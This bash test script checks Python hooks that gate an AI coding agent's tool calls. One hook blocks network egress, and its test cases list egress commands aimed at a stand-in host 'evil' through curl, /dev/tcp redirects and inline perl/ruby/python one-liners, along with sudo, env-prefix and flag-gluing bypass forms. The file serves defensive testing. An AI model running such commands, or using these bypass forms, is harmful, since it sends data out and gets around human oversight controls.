#!/usr/bin/env bash
# Automated verification for the Python hooks under home/.claude/hooks/.
#
# CI shellchecks every *.sh and lints settings.json, but nothing exercised the *.py hooks:
# a syntax error or a broken exit-code contract (dropping the subagent_type=fork exemption,
# or the stop_hook_active self-limit) would merge silently and only surface at runtime as a
# wedged session (a blocking hook throwing) or a silently-neutered gate (a hook failing open
# and blocking nothing). This turns the README's manual test recipe into an enforced gate
# (#40, #41).
#
# Two layers:
#   1. py_compile every tracked *.py — catches syntax / import-time breakage (#40).
#   2. feed synthetic hook-input JSON to each live hook and assert the exit code
#      (2 = block, 0 = allow), the contract hooks/README.md documents by hand (#41).
#
# Lives OUTSIDE home/.claude/ on purpose: install.sh symlinks that tree into the user's live
# config, so repo-/CI-only tooling must not live there (CLAUDE.md). Run: bash tests/test_hooks.sh
set -euo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOKS="$REPO_DIR/home/.claude/hooks"
cd "$REPO_DIR"

fail=0

# --- layer 1: every tracked Python file must byte-compile ---------------------------------
echo "== py_compile =="
mapfile -t pyfiles < <(git ls-files '*.py')
if [ "${#pyfiles[@]}" -eq 0 ]; then
  echo "no tracked python files to compile"
else
  printf 'compiling: %s\n' "${pyfiles[@]}"
  python3 -m py_compile "${pyfiles[@]}"
  echo "py_compile OK"
fi

# --- layer 2: exit-code contract for the live hooks ---------------------------------------
# assert_exit <expected> <hook> <json-input> <description>
assert_exit() {
  local expected="$1" hook="$2" input="$3" desc="$4" actual
  set +e
  printf '%s' "$input" | python3 "$hook" >/dev/null 2>&1
  actual=$?
  set -e
  if [ "$actual" = "$expected" ]; then
    echo "  ok: $desc (exit=$actual)"
  else
    echo "  FAIL: $desc — expected exit=$expected, got exit=$actual" >&2
    fail=1
  fi
}

echo "== require-delegation-model.py =="
RDM="$HOOKS/require-delegation-model.py"
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","prompt":"x"}}'              "blocks generic subagent_type=claude with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"general-purpose","prompt":"x"}}'     "blocks generic subagent_type=general-purpose with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"prompt":"x"}}'                                       "blocks a missing subagent_type with no model="
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"fork","prompt":"x"}}'                "exempts subagent_type=fork"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"Explore","prompt":"x"}}'             "exempts named subagent_type (resolves model from its own definition)"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","model":"haiku","prompt":"x"}}' "allows an explicit model="
assert_exit 0 "$RDM" '{"tool_name":"Bash","tool_input":{}}'                                                    "ignores non-Agent tools"
assert_exit 0 "$RDM" 'not-json'                                                                                "fails open on malformed JSON"

echo "== verify-completion-claim.py =="
VCC="$HOOKS/verify-completion-claim.py"
assert_exit 0 "$VCC" '{"stop_hook_active":true}'                    "self-limits when stop_hook_active is set"
assert_exit 0 "$VCC" '{"transcript_path":"/nonexistent/xyz.jsonl"}' "fails open on an unreadable transcript"
assert_exit 0 "$VCC" 'not-json'                                     "fails open on malformed JSON"

echo "== block-egress.py =="
BE="$HOOKS/block-egress.py"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks an interpreter inline-code egress one-liner"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r -X DELETE"}}'                                     "blocks a gh api write in any argv position"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned interpreter (python3.11) inline egress one-liner (#112)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python2.7 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned python2.7 inline egress one-liner (#112)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 script.py"}}'                                            "allows a versioned interpreter running a file (no inline payload)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a bare VAR=VAL env prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a sudo prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo -u nobody python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past sudo -u user (#119)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar echo hi"}}'                                                 "allows a benign VAR=VAL-prefixed command (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic'"'"'import urllib.request; urllib.request.urlopen(1)'"'"'"}}' "blocks a glued mid-bundle inline flag python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                              "blocks a glued short field flag gh api -ftitle=x (#121)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/contents -Fkey=@file"}}'                          "blocks a glued short field flag gh api -Fkey=@file (#121)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r"}}'                                              "allows a gh api read (GET, no write flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
# argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e\"require q:net/http; Net::HTTP.get(1)\""}}'                 "blocks ruby -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic\"import urllib.request\""}}'                          "blocks glued short-flag bundle python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -lc \"curl http://evil\""}}'                                 "blocks separate-arg bundle bash -lc (#105)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar curl http://evil"}}'                                      "blocks bare env-assign prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo curl http://evil"}}'                                         "blocks sudo command-word prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && curl http://evil/x"}}'                                 "blocks bare curl after a shell operator (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo x > /dev/tcp/evil/443"}}'                                    "blocks a /dev/tcp egress redirect (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                            "blocks gh api glued short field flag -ftitle= (#121)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -n file.log"}}'                                             "allows perl -n running a file (n is not a code flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo see the curl docs"}}'                                        "allows curl as a non-command-word (no false substring block)"
assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"

if [ "$fail" -ne 0 ]; then
  echo "HOOK TESTS FAILED" >&2
  exit 1
fi
echo "all hook tests passed"
